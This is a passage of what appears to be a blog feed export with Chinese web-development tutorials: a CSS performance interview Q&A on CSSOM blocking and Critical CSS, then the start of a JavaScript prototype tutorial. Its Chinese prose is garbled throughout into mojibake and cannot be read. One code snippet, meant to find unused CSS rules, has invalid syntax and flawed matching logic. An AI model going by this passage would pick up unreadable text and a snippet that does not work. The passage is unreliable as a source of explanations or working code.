class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.widget</span> &#123;<br>  <span class="hljs-attribute">contain</span>: strict; <span class="hljs-comment">/* æœ€ä¸¥æ ¼çš„éš”ç¦» */</span><br>  <span class="hljs-comment">/* ç­‰æ•ˆäº contain: size layout paint style */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>åŸç†ï¼šé™åˆ¶æµè§ˆå™¨é‡æ’&#x2F;é‡ç»˜çš„å½±å“èŒƒå›´</li><li>é€‚ç”¨åœºæ™¯ï¼šå¤æ‚åŠ¨ç”»ç»„ä»¶ã€é«˜é¢‘æ›´æ–°çš„UIæ¨¡å—</li></ul><p><strong>Qï¼šè¯·æè¿°ä»è¾“å…¥URLåˆ°é¡µé¢æ¸²æŸ“å®Œæˆè¿‡ç¨‹ä¸­ï¼ŒCSSä¼˜åŒ–çš„å®Œæ•´æœºä¼šç‚¹</strong></p><ul><li>èµ„æºåŠ è½½é˜¶æ®µï¼š<ul><li><link rel="preload">å…³é”®CSS</li><li>å¼‚æ­¥åŠ è½½éå…³é”®CSSï¼ˆmedia&#x3D;â€printâ€ï¼‰</li></ul></li><li>è§£æé˜¶æ®µï¼š<ul><li>å‡å°‘@importä½¿ç”¨</li><li>å†…è”é¦–å±å…³é”®CSSï¼ˆCritical CSSï¼‰</li></ul></li><li>æ¸²æŸ“é˜¶æ®µï¼š<ul><li>é¿å…åŒæ­¥å¸ƒå±€ï¼ˆForce Synchronous Layoutï¼‰</li><li>ä½¿ç”¨CSSåŠ¨ç”»ä»£æ›¿JSåŠ¨ç”»</li></ul></li><li>äº¤äº’é˜¶æ®µï¼š<ul><li>é˜²æŠ–å¤„ç†resize&#x2F;scrolläº‹ä»¶</li><li>ä½¿ç”¨passive: trueä¼˜åŒ–è§¦æ‘¸äº‹ä»¶</li></ul></li></ul><h2 id="6-6-æµè§ˆå™¨æ¸²æŸ“æµç¨‹ï¼ˆCSSOMã€Critical-CSSï¼‰"><a href="#6-6-æµè§ˆå™¨æ¸²æŸ“æµç¨‹ï¼ˆCSSOMã€Critical-CSSï¼‰" class="headerlink" title="6.6 æµè§ˆå™¨æ¸²æŸ“æµç¨‹ï¼ˆCSSOMã€Critical CSSï¼‰"></a>6.6 æµè§ˆå™¨æ¸²æŸ“æµç¨‹ï¼ˆCSSOMã€Critical CSSï¼‰</h2><h3 id="CSSOM-æ„å»ºè¿‡ç¨‹è€ƒå¯Ÿ"><a href="#CSSOM-æ„å»ºè¿‡ç¨‹è€ƒå¯Ÿ" class="headerlink" title="CSSOM æ„å»ºè¿‡ç¨‹è€ƒå¯Ÿ"></a>CSSOM æ„å»ºè¿‡ç¨‹è€ƒå¯Ÿ</h3><p><strong>Qï¼šæè¿°CSSOMæ ‘çš„æ„å»ºæµç¨‹åŠå…¶é˜»å¡ç‰¹æ€§</strong></p><ul><li>è§£æé˜¶æ®µ<ul><li>æµè§ˆå™¨é€æ¡è§£æ CSS è§„åˆ™ï¼Œç”Ÿæˆ CSSOM æ ‘ï¼ˆä¸ DOM æ ‘å¹¶è¡Œæ„å»ºï¼‰</li><li><code>@import</code>å’Œ<code>&lt;link&gt;</code>ä¼šè§¦å‘åŒæ­¥é˜»å¡ï¼ˆé™¤éæ˜¾å¼å¼‚æ­¥åŠ è½½ï¼‰</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS">&lt;!-- é˜»å¡æ¸²æŸ“ --&gt;<br>&lt;link rel=&quot;stylesheet&quot; href=&quot;<span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.css</span>&quot;&gt;<br><br>&lt;!-- å¼‚æ­¥åŠ è½½ --&gt;<br>&lt;link rel=&quot;stylesheet&quot; href=&quot;print<span class="hljs-selector-class">.css</span>&quot; media=&quot;print&quot; onload=&quot;this<span class="hljs-selector-class">.media</span>=&#x27;<span class="hljs-attribute">all</span>&#x27;&quot;&gt;<br></code></pre></td></tr></table></figure></li><li>è®¡ç®—é˜¶æ®µ<ul><li>å°† CSS è§„åˆ™è½¬æ¢ä¸ºæ ·å¼è§„åˆ™è¡¨ï¼ˆStyle Rulesï¼‰</li><li>é‡åˆ° JavaScript è®¿é—® CSSOM å±æ€§æ—¶è§¦å‘åŒæ­¥è§£æï¼ˆå¼ºåˆ¶å®Œæˆ CSSOM æ„å»ºï¼‰</li></ul></li></ul><p><strong>Qï¼šå¦‚ä½•éªŒè¯ CSSOM æ„å»ºé˜»å¡ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æµ‹è¯•ä»£ç ï¼ˆæ”¾åœ¨&lt;head&gt;ä¸­ï¼‰</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;cssom&#x27;</span>);<br><span class="hljs-title function_">getComputedStyle</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;cssom&#x27;</span>); <br><span class="hljs-comment">// æ—¶é—´å·®=CSSOMæ„å»ºè€—æ—¶</span><br></code></pre></td></tr></table></figure><h3 id="Critical-CSSå®æˆ˜æ–¹æ¡ˆ"><a href="#Critical-CSSå®æˆ˜æ–¹æ¡ˆ" class="headerlink" title="Critical CSSå®æˆ˜æ–¹æ¡ˆ"></a>Critical CSSå®æˆ˜æ–¹æ¡ˆ</h3><p><strong>Qï¼šé¦–å±ä¼˜åŒ–çš„Critical CSSæå–ç­–ç•¥ï¼Ÿ</strong></p><p>å·¥å…·é“¾ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨Penthouseæå–å…³é”®CSS</span><br>npm install penthouse -g<br>penthouse http://example.com critical.css<br></code></pre></td></tr></table></figure><p>å®æ–½æ­¥éª¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- å†…è”å…³é”®CSS --&gt;<br>&lt;style&gt;<br>  .header, .hero &#123; /* é¦–å±å¯è§åŒºåŸŸæ ·å¼ */ &#125;<br>&lt;/style&gt;<br><br>&lt;!-- å¼‚æ­¥åŠ è½½å‰©ä½™CSS --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;full.css&quot; as=&quot;style&quot; onload=&quot;this.rel=&#x27;stylesheet&#x27;&quot;&gt;<br>&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;full.css&quot;&gt;&lt;/noscript&gt;<br></code></pre></td></tr></table></figure><h3 id="CSSä¸JavaScript"><a href="#CSSä¸JavaScript" class="headerlink" title="CSSä¸JavaScript"></a>CSSä¸JavaScript</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆè¯´â€CSSä¼šé˜»å¡JavaScriptæ‰§è¡Œâ€ï¼Ÿ</strong></p><ul><li>é»˜è®¤è¡Œä¸ºï¼š<ul><li>æµè§ˆå™¨é‡åˆ°<code>&lt;script&gt;</code>æ—¶ä¼šæš‚åœ DOM æ„å»º</li><li>å¦‚æœå­˜åœ¨æœªå®Œæˆçš„ CSSOM æ„å»ºï¼ŒJavaScriptæ‰§è¡Œå°†è¢«é˜»å¡</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;link rel=&quot;stylesheet&quot; href=&quot;slow.css&quot;&gt;<br>&lt;script&gt;<br>  // æ­¤è„šæœ¬å¿…é¡»ç­‰å¾…slow.cssä¸‹è½½å¹¶è§£æå®Œæˆ<br>  console.log(&#x27;After CSSOM&#x27;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šä¼˜åŒ–æ–¹æ¡ˆï¼Ÿ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- æ–¹æ¡ˆ1ï¼šæ·»åŠ defer --&gt;<br>&lt;script defer src=&quot;app.js&quot;&gt;&lt;/script&gt;<br><br>&lt;!-- æ–¹æ¡ˆ2ï¼šåŠ¨æ€æ³¨å…¥CSS --&gt;<br>&lt;script&gt;<br>  const link = document.createElement(&#x27;link&#x27;);<br>  link.rel = &#x27;stylesheet&#x27;;<br>  link.href = &#x27;non-critical.css&#x27;;<br>  document.head.appendChild(link);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="å¦‚ä½•è®¾è®¡CSSæ€§èƒ½ç›‘æ§åŸ‹ç‚¹ç³»ç»Ÿ"><a href="#å¦‚ä½•è®¾è®¡CSSæ€§èƒ½ç›‘æ§åŸ‹ç‚¹ç³»ç»Ÿ" class="headerlink" title="å¦‚ä½•è®¾è®¡CSSæ€§èƒ½ç›‘æ§åŸ‹ç‚¹ç³»ç»Ÿ"></a>å¦‚ä½•è®¾è®¡CSSæ€§èƒ½ç›‘æ§åŸ‹ç‚¹ç³»ç»Ÿ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. ç›‘æ§CSSåŠ è½½æ—¶é—´</span><br><span class="hljs-keyword">const</span> cssResource = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">&#x27;resource&#x27;</span>)<br>  .<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">&#x27;css&#x27;</span>);<br>  <br><span class="hljs-comment">// 2. æ£€æµ‹æœªä½¿ç”¨CSS</span><br><span class="hljs-keyword">const</span> &#123; unusedRules &#125; = <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">devtools</span>.<span class="hljs-property">inspectedWindow</span>.<span class="hljs-built_in">eval</span>(<br>  <span class="hljs-string">`(<span class="hljs-subst">$&#123;() =&gt; &#123;</span></span><br><span class="hljs-subst"><span class="hljs-string">    <span class="hljs-keyword">const</span> used = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Set</span>();</span></span><br><span class="hljs-subst"><span class="hljs-string">    <span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(<span class="hljs-variable language_">document</span>.querySelectorAll(<span class="hljs-string">&#x27;*&#x27;</span>))</span></span><br><span class="hljs-subst"><span class="hljs-string">      .forEach(el =&gt; used.add(el.className));</span></span><br><span class="hljs-subst"><span class="hljs-string">    <span class="hljs-keyword">return</span> unusedRules: <span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(<span class="hljs-variable language_">document</span>.styleSheets)</span></span><br><span class="hljs-subst"><span class="hljs-string">      .flatMap(sheet =&gt; <span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(sheet.cssRules)</span></span><br><span class="hljs-subst"><span class="hljs-string">      .filter(rule =&gt; !used.has(rule.selectorText))</span></span><br><span class="hljs-subst"><span class="hljs-string">  &#125;&#125;</span>)()`</span><br>);<br></code></pre></td></tr></table></figure><h1 id="ç¬¬ä¸ƒç« ï¼šå®æˆ˜ä¸å‰æ²¿æŠ€æœ¯"><a href="#ç¬¬ä¸ƒç« ï¼šå®æˆ˜ä¸å‰æ²¿æŠ€æœ¯" class="headerlink" title="ç¬¬ä¸ƒç« ï¼šå®æˆ˜ä¸å‰æ²¿æŠ€æœ¯"></a>ç¬¬ä¸ƒç« ï¼šå®æˆ˜ä¸å‰æ²¿æŠ€æœ¯</h1><h2 id="7-1-CSS-ç»˜åˆ¶å¤æ‚å›¾å½¢ï¼ˆclip-pathã€SVG-CSSï¼‰"><a href="#7-1-CSS-ç»˜åˆ¶å¤æ‚å›¾å½¢ï¼ˆclip-pathã€SVG-CSSï¼‰" class="headerlink" title="7.1 CSS ç»˜åˆ¶å¤æ‚å›¾å½¢ï¼ˆclip-pathã€SVG + CSSï¼‰"></a>7.1 CSS ç»˜åˆ¶å¤æ‚å›¾å½¢ï¼ˆclip-pathã€SVG + CSSï¼‰</h2><h2 id="7-2-æš—é»‘æ¨¡å¼å®ç°ï¼ˆprefers-color-schemeï¼‰"><a href="#7-2-æš—é»‘æ¨¡å¼å®ç°ï¼ˆprefers-color-schemeï¼‰" class="headerlink" title="7.2 æš—é»‘æ¨¡å¼å®ç°ï¼ˆprefers-color-schemeï¼‰"></a>7.2 æš—é»‘æ¨¡å¼å®ç°ï¼ˆprefers-color-schemeï¼‰</h2><h2 id="7-3-è§†å·®æ»šåŠ¨ï¼ˆbackground-attachmentï¼‰"><a href="#7-3-è§†å·®æ»šåŠ¨ï¼ˆbackground-attachmentï¼‰" class="headerlink" title="7.3 è§†å·®æ»šåŠ¨ï¼ˆbackground-attachmentï¼‰"></a>7.3 è§†å·®æ»šåŠ¨ï¼ˆbackground-attachmentï¼‰</h2><h2 id="7-4-CSS-Houdiniï¼ˆè‡ªå®šä¹‰å±æ€§ã€Paint-APIï¼‰"><a href="#7-4-CSS-Houdiniï¼ˆè‡ªå®šä¹‰å±æ€§ã€Paint-APIï¼‰" class="headerlink" title="7.4 CSS Houdiniï¼ˆè‡ªå®šä¹‰å±æ€§ã€Paint APIï¼‰"></a>7.4 CSS Houdiniï¼ˆè‡ªå®šä¹‰å±æ€§ã€Paint APIï¼‰</h2><h2 id="7-5-æœªæ¥-CSS-è¶‹åŠ¿ï¼ˆ-containerã€subgridã€-has-ï¼‰"><a href="#7-5-æœªæ¥-CSS-è¶‹åŠ¿ï¼ˆ-containerã€subgridã€-has-ï¼‰" class="headerlink" title="7.5 æœªæ¥ CSS è¶‹åŠ¿ï¼ˆ@containerã€subgridã€:has()ï¼‰"></a>7.5 æœªæ¥ CSS è¶‹åŠ¿ï¼ˆ@containerã€subgridã€:has()ï¼‰</h2>]]></content>
    
    
    <categories>
      
      <category>CSS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript åŸå‹/åŸå‹é“¾ä¸“é¢˜çŸ¥è¯†å­¦ä¹ </title>
    <link href="/2025/06/21/JavaScript%20Prototype/"/>
    <url>/2025/06/21/JavaScript%20Prototype/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« ï¼šJavaScript-å¯¹è±¡åŸºç¡€"><a href="#ç¬¬ä¸€ç« ï¼šJavaScript-å¯¹è±¡åŸºç¡€" class="headerlink" title="ç¬¬ä¸€ç« ï¼šJavaScript å¯¹è±¡åŸºç¡€"></a>ç¬¬ä¸€ç« ï¼šJavaScript å¯¹è±¡åŸºç¡€</h1><h2 id="1-1-å¯¹è±¡çš„æ¦‚å¿µä¸åˆ›å»ºæ–¹å¼"><a href="#1-1-å¯¹è±¡çš„æ¦‚å¿µä¸åˆ›å»ºæ–¹å¼" class="headerlink" title="1.1 å¯¹è±¡çš„æ¦‚å¿µä¸åˆ›å»ºæ–¹å¼"></a>1.1 å¯¹è±¡çš„æ¦‚å¿µä¸åˆ›å»ºæ–¹å¼</h2><p><strong>åŸºæœ¬æ¦‚å¿µ</strong></p><p>JavaScript å¯¹è±¡æ˜¯é”®å€¼å¯¹çš„é›†åˆï¼Œæ˜¯ JavaScript çš„æ ¸å¿ƒæ•°æ®ç±»å‹ã€‚å¯¹è±¡å¯ä»¥çœ‹ä½œæ˜¯æ— åºçš„å±æ€§é›†åˆï¼Œæ¯ä¸ªå±æ€§éƒ½æœ‰ä¸€ä¸ªåç§°ï¼ˆé”®ï¼‰å’Œä¸€ä¸ªå€¼ã€‚</p><p>å¯¹è±¡çš„ç‰¹ç‚¹æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>åŠ¨æ€æ€§ï¼šéšæ—¶å¯æ·»åŠ &#x2F;åˆ é™¤å±æ€§</li><li>å¼•ç”¨ç±»å‹ï¼šå¯¹è±¡æ˜¯é€šè¿‡å¼•ç”¨è®¿é—®çš„å¤åˆå€¼</li><li>åŸå‹ç»§æ‰¿ï¼šæ¯ä¸ªå¯¹è±¡éƒ½æœ‰åŸå‹é“¾</li><li>å±æ€§ç‰¹æ€§ï¼šå¯¹è±¡çš„å±æ€§å¯ä»¥æ‹¥æœ‰å¯è¯»ã€å¯å†™ã€å¯æšä¸¾ã€å¯é…ç½®ç­‰ç‰¹æ€§</li></ul><span id="more"></span><p><strong>åˆ›å»ºæ–¹å¼</strong></p><p>ï¼ˆ1ï¼‰å¯¹è±¡å­—é¢é‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>  <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½ å¥½ï¼Œæˆ‘æ˜¯<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰new Object()æ„é€ å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> car = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>car.<span class="hljs-property">brand</span> = <span class="hljs-string">&#x27;Toyota&#x27;</span>;<br>car.<span class="hljs-property">model</span> = <span class="hljs-string">&#x27;Camry&#x27;</span>;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ„é€ å‡½æ•°æ–¹å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;æå››&#x27;</span>, <span class="hljs-number">25</span>);<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰Object.create()æ–¹å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> prototypeObj = &#123;<br>  <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello!&#x27;</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> myObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(prototypeObj);<br>myObj.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;ç‹äº”&#x27;</span>;<br></code></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰ES6 class è¯­æ³•ç³–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>  <br>  <span class="hljs-title function_">speak</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span> makes a noise.`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-string">&#x27;Dog&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="1-2-å±æ€§çš„è®¿é—®ä¸æ“ä½œ"><a href="#1-2-å±æ€§çš„è®¿é—®ä¸æ“ä½œ" class="headerlink" title="1.2 å±æ€§çš„è®¿é—®ä¸æ“ä½œ"></a>1.2 å±æ€§çš„è®¿é—®ä¸æ“ä½œ</h2><p><strong>è®¿é—®å±æ€§</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç‚¹è¡¨ç¤ºæ³•</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);<br><br><span class="hljs-comment">// æ–¹æ‹¬å·è¡¨ç¤ºæ³•</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person[<span class="hljs-string">&#x27;age&#x27;</span>]);<br></code></pre></td></tr></table></figure><p><strong>å±æ€§æ“ä½œ</strong></p><p>ï¼ˆ1ï¼‰æ·»åŠ &#x2F;åˆ é™¤å±æ€§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">person.<span class="hljs-property">job</span> = <span class="hljs-string">&#x27;Developer&#x27;</span>;<br>person[<span class="hljs-string">&#x27;hobby&#x27;</span>] = <span class="hljs-string">&#x27;Reading&#x27;</span>;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åˆ é™¤å±æ€§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">delete</span> person.<span class="hljs-property">age</span>;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ£€æŸ¥å±æ€§æ˜¯å¦å­˜åœ¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">in</span> person); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;name&#x27;</span>)); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="1-3-å¯¹è±¡ä¸åŸå§‹ç±»å‹çš„åŒºåˆ«"><a href="#1-3-å¯¹è±¡ä¸åŸå§‹ç±»å‹çš„åŒºåˆ«" class="headerlink" title="1.3 å¯¹è±¡ä¸åŸå§‹ç±»å‹çš„åŒºåˆ«"></a>1.3 å¯¹è±¡ä¸åŸå§‹ç±»å‹çš„åŒºåˆ«</h2><ul><li>å­˜å‚¨ä¸è®¿é—®æœºåˆ¶ï¼šåŸå§‹ç±»å‹å­˜å‚¨åœ¨æ ˆå†…å­˜ä¸­ï¼Œå¯¹è±¡ç±»å‹å­˜å‚¨åœ¨å †å†…å­˜ä¸­ï¼Œå˜é‡ä¿å­˜å…¶å¼•ç”¨åœ°å€</li><li>å¯å˜æ€§å·®å¼‚ï¼šåŸå§‹ç±»å‹ä¸å¯å˜ï¼Œå¯¹è±¡ç±»å‹å¯å˜</li><li>æ¯”è¾ƒè¡Œä¸ºï¼šåŸå§‹ç±»å‹å¯¹æ¯”å€¼ï¼Œå¯¹è±¡ç±»å‹å¯¹æ¯”å¼•ç”¨</li><li>æ–¹æ³•ä¸å±æ€§ï¼šåŸå§‹ç±»å‹ä¸èƒ½æ·»åŠ å±æ€§å’Œæ–¹æ³•ï¼Œå¯¹è±¡ç±»å‹å¯ä»¥è‡ªç”±æ·»åŠ &#x2F;ä¿®æ”¹</li></ul><h1 id="ç¬¬äºŒç« ï¼šåˆè¯†åŸå‹ï¼ˆPrototypeï¼‰"><a href="#ç¬¬äºŒç« ï¼šåˆè¯†åŸå‹ï¼ˆPrototypeï¼‰" class="headerlink" title="ç¬¬äºŒç« ï¼šåˆè¯†åŸå‹ï¼ˆPrototypeï¼‰"></a>ç¬¬äºŒç« ï¼šåˆè¯†åŸå‹ï¼ˆPrototypeï¼‰</h1><h2 id="2-1-ä»€ä¹ˆæ˜¯åŸå‹ï¼Ÿ"><a href="#2-1-ä»€ä¹ˆæ˜¯åŸå‹ï¼Ÿ" class="headerlink" title="2.1 ä»€ä¹ˆæ˜¯åŸå‹ï¼Ÿ"></a>2.1 ä»€ä¹ˆæ˜¯åŸå‹ï¼Ÿ</h2><p>åŸå‹ï¼ˆPrototypeï¼‰æ˜¯ JavaScript å®ç°ç»§æ‰¿çš„æ ¸å¿ƒæœºåˆ¶ã€‚æ¯ä¸ª JavaScript å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªå†…ç½®çš„ [[Prototype]] å±æ€§ï¼ˆå¯é€šè¿‡ <code>__proto__</code> è®¿é—®ï¼‰ï¼ŒæŒ‡å‘å®ƒçš„åŸå‹å¯¹è±¡</p><h2 id="2-2-prototype-å±æ€§çš„ä½œç”¨"><a href="#2-2-prototype-å±æ€§çš„ä½œç”¨" class="headerlink" title="2.2Â prototypeÂ å±æ€§çš„ä½œç”¨"></a>2.2Â <code>prototype</code>Â å±æ€§çš„ä½œç”¨</h2><p>prototype æ˜¯ JavaScript ä¸­å‡½æ•°å¯¹è±¡ç‰¹æœ‰çš„å±æ€§ï¼Œå®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯ä¸ºåŸºäºè¯¥æ„é€ å‡½æ•°åˆ›å»ºçš„å®ä¾‹æä¾›å…±äº«çš„å±æ€§å’Œæ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-comment">// æ·»åŠ åˆ°prototypeçš„æ–¹æ³•ä¼šè¢«æ‰€æœ‰å®ä¾‹å…±äº«</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br>p1.<span 